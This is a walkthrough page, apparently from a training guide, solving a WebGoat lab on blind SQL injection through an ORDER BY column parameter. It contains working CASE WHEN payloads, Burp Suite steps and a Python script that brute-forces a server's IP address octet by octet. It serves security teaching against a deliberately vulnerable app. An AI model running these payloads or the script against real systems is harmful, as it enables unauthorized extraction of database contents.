---
title: "A3:2021 | SQL Injection Mitigation (12) | Cycubix Docs"
layout: default
nav_order: 12
parent: "A3:2021 | Injection | SQL Injection Mitigation | Cycubix Docs"
grand_parent: "A3:2021 | Injection | Cycubix Docs"
---
# A3:2021 | SQL Injection Mitigation (12) | Cycubix Docs

In this assignment try to perform an SQL injection through the ORDER BY field. Try to find the ip address of the `webgoat-prd` server, guessing the complete ip address might take too long so we give you the last part: `xxx.130.219.202`

Note: The submit field of this assignment is **NOT** vulnerable to an SQL injection.

<figure><img src="../../../../../.gitbook/assets/list of servers.png" alt=""><figcaption></figcaption></figure>

#### Solution

*  Try sorting and look at the request
* Intercept the request and try to specify a different order by
* Use for example "(case when (true) then hostname else id end)" in the order by and see what happens
* There are many ways of solving this lab. 

**Script**

* Click on column sort performs a request to [http://localhost:8080/WebGoat/SqlInjection/servers?column=ip](http://localhost:8080/WebGoat/SqlInjection/servers?column=ip). This can be exploited by intercepting the request with Browser Tools and providing prepared string as column value.
* To get the idea about **webgoat-prd** IP address we first have to find out the table name and ip column name. The obvious guess is **servers** and **ip**:\
   `column=(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)`
* If that is the correct table and column name, the table will get sorted by **ids**.
* So after intercepting and changing the request we get the table sorted by **ids**, the guess was correct.
* Just to check our logic, lets send request with:\
   `column=(CASE WHEN (SELECT ip FROM whatever WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)`
* It get's an error page, we have everything to script the attack now.

```
import json  
import requests  
  
def sql_injection_mitigation_10():  
	 index = 0  
  
	 headers = {  
		 'Cookie': 'JSESSIONID=id'  
	 }  
  
	 while True:  
		 payload = '(CASE WHEN (SELECT ip FROM servers WHERE hostname=\'webgoat-prd\') LIKE \'{}.%\' THEN id ELSE hostname END)'.format(index)  
  
		 r = requests.get('http://host:port/WebGoat/SqlInjection/servers?column=' + payload, headers=headers)  
  
		 try:  
			 response = json.loads(r.text)  
		 except:  
			 print("Wrong JSESSIONID, find it by looking at your requests once logged in.")  
			 return  
  
		 if response[0]['id'] == '1':  
			 print('webgoat-prd IP: {}.130.219.202'.format(index))  
			 return  
		 else:  
			 index += 1  
			 if index > 255:  
				 print("No IP found")  
				 return  
  
sql_injection_mitigation_10()
```

**Burp** 

* If you are already in the lesson page turn on the interceptor on. Remember by the Hints given, we need to intercept the request and try to specify a different order by. 
* Click on edit and then click once on the up and down arrow in the column of IP. 
* Find the request and send it to the Repeater. See the lists of servers. 

<figure><img src="../../../../../.gitbook/assets/column ip.png" alt=""><figcaption></figcaption></figure>

* Add a single quote in the column=ip parameter. When you click send it will show you message "Internal Server Error". "java.sql.SQLSyntaxErrorException: malformed string: '

<figure><img src="../../../../../.gitbook/assets/internal server error.png" alt=""><figcaption></figcaption></figure>

* Click on "raw" tab. In statement \[select id, hostname, ip, mac, status, description from SERVERS where status <> 'out of order' order by ip' remove ip' and copy the following code to test true case SQL Injection. Also, remember by the hints that we should use for example "(case when (true) then hostname else id end)" in the order by and see what happens. 
* Insert the following ORDER BY clause replacing ip'. 

<figure><img src="../../../../../.gitbook/assets/statement CASE.png" alt=""><figcaption></figcaption></figure>

* You can compare with the previous image and see that now that there is a server hostname equal to ‘webgoat-prd’ and the list is ordered by ID. Else, it would be ordered by "status". 
* We can also try a false statement with the following statement, expecting a false result and ordering by status. 

(CASE+WHEN+(SELECT+substring(ip,1,1)+FROM+servers+WHERE+hostname='webgoat-lzp')+=+'1'+THEN+id+ELSE+status+END)

<figure><img src="../../../../../.gitbook/assets/false statement.png" alt=""><figcaption></figcaption></figure>

* Given that the order is not by ID we can try to guess the IP address for 'webgoat=prd' server by checking one number at the time. 

Examples: 

substring(IP address, 1,2)='5'

(CASE+WHEN+(SELECT+substring(ip,1,2)+FROM+servers+WHERE+hostname='webgoat-prd')+=+'5.'+THEN+id+ELSE+status+END)

* The correct number, after trying to guess possible numbers is 104. 

<figure><img src="../../../../../.gitbook/assets/104 ip.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/sql mitigation 12.png" alt=""><figcaption></figcaption></figure>

